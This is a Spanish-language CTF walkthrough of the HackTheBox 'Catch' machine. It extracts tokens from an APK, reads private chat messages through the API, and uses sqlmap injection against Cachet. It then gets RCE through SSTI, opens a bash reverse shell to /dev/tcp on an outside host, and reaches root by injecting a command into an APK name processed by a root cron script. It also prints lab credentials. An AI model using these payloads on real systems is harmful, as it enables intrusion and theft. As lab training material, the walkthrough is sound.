# Máquina "Catch" de HackTheBox

## Características

- **SO**: Linux  
- **Aplicación**: Android
- **Dificultad**: Media  
- **Análisis APK**: apktool, d2j-dex2jar, JD-GUI 
- **Inspección de código**: Information Leakage 
- **Valores de token visibles**: Cachet Framework Exploitation 
- **SQLI**: Let's Chat Exploitation 
- **Abuso de API**: Reading Private Messages, Cachet Framework Exploitation 
- **Server Side Template Injection (SSTI)**: [RCE] Abusing Cron Job [Privilege Escalation]
- **Tecnologías**: Redis, Apache, SSH, OpenSSH
- **Tipo de ataques**: Public Vulnerabilities, Enumeration, Lateral Movement, Use Of Injection Attacks
- **Nivel**: Penetration Tester Level 2

## Utilidad para certificaciones

- eWPT
- eWPTXv2
- OSWE
- Mobile

---

## Reconocimiento inicial

**IP**: 10.10.11.150

Realizamos un escaneo exhaustivo y rápido sin precaución:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.150 -oG allPorts
```

**Puertos encontrados**:
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
5000/tcp open  upnp
8000/tcp open  http-alt
```

Realizamos un escaneo detallado de los servicios:

```bash
nmap -p 22,80,3000,5000,8000 -sCV 10.10.11.150 -oG targeted
```

**Resultados del escaneo detallado**:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Catch Global Systems
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close                                                        
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=11f4bcc216e281a0; Path=/; HttpOnly
|     Set-Cookie: _csrf=TqeCOMxg0eXNRMeRtlBTI5MB66E6MTY1NDk4MDE5NDk5MzE4MjQ4Mw;
5000/tcp open  upnp?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge:                                                       
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 302 Found
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Catch Global Systems
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Análisis de servicios web

Ejecutamos whatweb en los puertos más altos:

### Puerto 5000
```bash
whatweb 10.10.11.150:5000
```

**Resultado**:
- Redirección a `/login`
- Aplicación: Let's Chat
- Headers de seguridad configurados

### Puerto 8000
```bash
whatweb 10.10.11.150:8000
```

### Puerto 3000
```bash
whatweb 10.10.11.150:3000
```

---

## Análisis del sistema operativo

Identificamos que el puerto 22 ejecuta:
- **SSH**: OpenSSH 8.2p1 Ubuntu 4ubuntu0.4

Buscando en Launchpad, corresponde a **Ubuntu Focal**.

El puerto 80 ejecuta:
- **Apache**: httpd 2.4.41

La diferencia en versiones sugiere que podríamos estar frente a contenedores.

---

## Análisis de la aplicación web (Puerto 80)

![Página web principal](/secciones/posts/imagenes/catch/web1.webp)

Ninguno de los enlaces de la página conduce a ninguna parte, excepto el botón "Descargar ahora", que descarga `catchv1.0.apk`.

---

## Análisis de la APK

### Instalación de herramientas

```bash
sudo apt install android-apktool
```

### Descompilación de la APK

```bash
apktool -d catchv1.0.apk
```

Esto descomprimirá la APK. Entramos y revisamos archivos como `AndroidManifest.xml`, `apktool.yml`, pero hay un archivo interesante en `/res/values/strings.xml`.

### Extracción de tokens

```bash
cat res/values/strings.xml | grep token
```

**Tokens encontrados**:
```xml
<string name="gitea_token">b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0</string>
<string name="lets_chat_token">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==</string>
<string name="slack_token">xoxp-23984754863-2348975623103</string>
```

Guardamos los tokens:
```bash
cat res/values/strings.xml | grep token | sed 's/^ *//' > ../token
```

### Búsqueda de direcciones

```bash
grep -r -i "10.10.11.150"
grep -r -i "catch"
```

Encontramos una nueva dirección: **status.catch.htb**

---

## Análisis alternativo con dex2jar

Para un análisis más profundo del código fuente:

```bash
sudo apt install dex2jar
d2j-dex2jar aplicacion.apk
```

Esto crea un archivo `.jar` que podemos analizar con JD-GUI para inspeccionar el código de manera más detallada.

---

## Configuración de hosts

Agregamos al `/etc/hosts`:
```
10.10.11.150 catch.htb status.catch.htb
```

---

## Análisis de servicios web por puerto

### Puerto 5000 - Let's Chat

![Let's Chat login](/secciones/posts/imagenes/catch/letchat1.webp)

Encontramos que es una aplicación de chat auto-hospedada. Revisamos el repositorio en GitHub:
- https://github.com/sdelements/lets-chat

### Puerto 8000 - Dashboard

![Dashboard](/secciones/posts/imagenes/catch/past1.png)

---

## Explotación de la API de Let's Chat

### Consulta inicial (sin autorización)

```bash
curl -s -X GET "http://10.10.11.150:5000/rooms"
```

**Resultado**: Unauthorized

### Consulta con token de autorización

```bash
curl -s -X GET "http://10.10.11.150:5000/rooms" -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ=="
```

![Respuesta de la API](/secciones/posts/imagenes/catch/savesi2.jpg)

### Consulta formateada con jq

```bash
curl -s -X GET "http://10.10.11.150:5000/rooms" -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | jq
```

![Respuesta formateada](/secciones/posts/imagenes/catch/salida3.jpg)

### Obtención de mensajes

```bash
curl -s -X GET "http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages" -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTUwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | jq '.[].text'
```

![Mensajes obtenidos](/secciones/posts/imagenes/catch/salida4.jpg)

**Credenciales encontradas en los mensajes**:
```
"Here are the credentials john : E}WV!mywu_69T4C}"
```

**Credenciales**: `john : E}WV!mywu_69T4C}`

---

## Acceso al dashboard (Puerto 8000)

Utilizamos las credenciales encontradas para acceder al dashboard que funciona en el puerto 8000.

En la sección de configuración podemos ver la versión de la aplicación Cachet: **2.4.0-dev**

---

## Explotación de Cachet - SQL Injection

Buscamos vulnerabilidades para la versión y encontramos:
- https://twitter.com/therceman/status/1432929600141725697
- https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html

### Explotación con SQLMap

```bash
sqlmap -u "http://10.10.11.150:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+%22" --dbs --batch
```

**Bases de datos encontradas**:
```
[*] cachet  
[*] information_schema  
[*] mysql  
[*] performance_schema  
[*] sys  
```

### Extracción de datos de usuarios

```bash
sqlmap -u "http://10.10.11.150:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+%22" -D cachet -T users -C api_key,username --dump --batch
```

![Datos extraídos](/secciones/posts/imagenes/catch/save3.png)

---

## Server Side Template Injection (SSTI)

### Creación de incident con SSTI

```bash
curl -X POST -H "X-Cachet-Token: 7GVCqTY5abrox4" "http://10.10.11.150:8000/api/v1/incidents" \
     -d "visible=0&status=1&name=demo&template={% raw %}{{233*233}}{% endraw %}" | jq


```

![Respuesta SSTI](/secciones/posts/imagenes/catch/save4.png)

### Verificación de ejecución de código

La salida muestra `54289`, confirmando que el código se ejecutó correctamente.

### Remote Code Execution (RCE)

Probamos diferentes payloads:
```bash
{% raw %}
{{["id"]|filter("system")|join(",")}}
{% endraw %}

{% raw %}
{{["id"]|map("system")|join(",")}}
{% endraw %}
```

![Confirmación RCE](/secciones/posts/imagenes/catch/save6.png)

### Reverse Shell

Nos ponemos en escucha:
```bash
nc -nlvp 443
```

Ejecutamos el payload:
```bash
{% raw %}
{{["bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'"]|filter("system")|join(",")}}
{% endraw %}
```

---

## Acceso inicial y configuración

Obtenemos acceso como `www-data`. Configuramos la shell:

```bash
script /dev/null -c bash
# Ctrl + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Verificamos que estamos en un contenedor:
```bash
whoami  # www-data
hostname  # q8eh27eh8qhf 
hostname -i  # 172.17.0.15
```

---

## Escalada de privilegios en el contenedor

### Búsqueda de archivos .env

```bash
find \-name .env 2>/dev/null
```

![Archivo .env encontrado](/secciones/posts/imagenes/catch/save7.png)

**Credenciales encontradas en .env**:
```
DB_USERNAME=will
DB_PASSWORD=s2#4Fg0_%3!
```

---

## Acceso SSH a la máquina host

```bash
ssh will@10.10.11.150
```

Obtenemos acceso y la flag de usuario.

---

## Escalada de privilegios final

### Análisis de procesos

```bash
ps auxww
```

Observamos múltiples procesos `docker-proxy` y exploramos `/opt/`:

```bash
ls /opt/
# containerd  mdm
```

### Análisis del directorio MDM

```bash
ls /opt/mdm/
# apk_bin  verify.sh
```

### Análisis del script verify.sh

El script se ejecuta cada minuto como root y procesa archivos APK en `/opt/mdm/apk_bin/`.

**Función vulnerable (app_check)**:
```bash
app_check() {                                    
    APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml") 
    echo $APP_NAME
    if [[ $APP_NAME == *"Catch"* ]]; then
        echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
        mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
    else
        echo "[!] App doesn't belong to Catch Global"
        cleanup                      
        exit
    fi
}  
```

### Explotación de la inyección de comandos

#### Descompilación de la APK original

```bash
java -jar apktool_2.6.1.jar d catchv1.0.apk -o decomp
```

#### Modificación del nombre de la aplicación

Editamos `decomp/res/values/strings.xml`:
```xml
<string name="app_name">Catch$(cp /bin/bash /tmp/test; chmod 4777 /tmp/test)</string>
```

#### Recompilación de la APK

```bash
java -jar apktool_2.6.1.jar b -f decomp/ -o modified.apk
```

#### Subida de la APK maliciosa

```bash
sshpass -p 's2#4Fg0_%3!' scp modified.apk will@10.10.11.150:/opt/mdm/apk_bin/
```

### Obtención de root

Después de un minuto, verificamos que el archivo SetUID se creó:

```bash
ls -la /tmp/test
```

Ejecutamos el shell con privilegios de root:

```bash
/tmp/test -p
```

```bash
test-5.0# id
uid=1000(will) gid=1000(will) euid=0(root) groups=1000(will)
```

¡Obtenemos acceso root y podemos leer la flag final!

---

## Resumen

Esta máquina involucró:
1. **Análisis de APK** para extraer tokens y descubrir subdominios
2. **Explotación de API** de Let's Chat para obtener credenciales
3. **SQL Injection** en Cachet para extraer API keys
4. **Server Side Template Injection** para obtener RCE
5. **Escalada de privilegios** mediante inyección de comandos en un script de procesamiento de APK

La máquina es excelente para practicar análisis de aplicaciones móviles y múltiples vectores de ataque web.

